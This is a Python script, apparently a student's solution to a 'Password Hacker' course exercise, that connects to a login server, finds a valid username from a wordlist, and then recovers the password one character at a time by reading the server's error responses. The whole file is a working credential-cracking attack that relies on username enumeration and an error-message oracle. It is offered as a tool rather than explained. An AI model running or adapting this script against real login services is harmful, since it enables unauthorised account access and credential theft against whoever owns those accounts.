import json
import socket
import sys


def file_line_iterator(filename):
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()


host, port = sys.argv[1:]
address = (host, int(port))

with socket.socket() as sock:
    sock.connect(address)
    login_list = file_line_iterator(
        filename="/Users/akshitmehta/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/Step.txt")
    found = False
    request_exceeded = False

    try:
        username = None
        for login in login_list:
            credentials = json.dumps({"login": login, "password": "asoiaf"})
            sock.send(credentials.encode())
            response = json.loads(sock.recv(1024).decode())
            if response["result"] == "Wrong password!":
                username = login
                break
        password = ''
        while True:
            found = False
            for ascii_code in range(128):
                passw = password + chr(ascii_code)
                credentials = json.dumps({"login": username, "password": passw})
                sock.send(credentials.encode())
                response = json.loads(sock.recv(1024).decode())
                if response["result"] == "Exception happened during login":
                    password += chr(ascii_code)
                    break
                elif response["result"] == "Connection success!":
                    found = True
                    break
            if found:
                break
        credentials = {"login": username, "password": password}
        print(json.dumps(credentials))

    except StopIteration:
        pass

    if not found:
        print("Too many attempts or incorrect host/port.")
